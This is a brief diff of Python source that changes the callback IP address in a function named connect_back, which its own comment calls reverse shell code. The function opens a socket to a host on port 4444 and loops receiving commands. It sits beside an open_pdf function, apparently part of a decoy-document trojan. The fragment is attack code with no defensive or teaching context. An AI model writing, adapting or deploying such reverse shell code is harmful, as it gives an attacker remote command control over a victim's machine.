@@ -24,7 +24,7 @@ def open_pdf():
 def connect_back():
     # Your existing reverse shell code here
     s = socket.socket()
-    s.connect(("10.0.0.5", 4444))
+    s.connect(("192.168.56.101", 4444))
     while True:
         try:
             # Receive the command
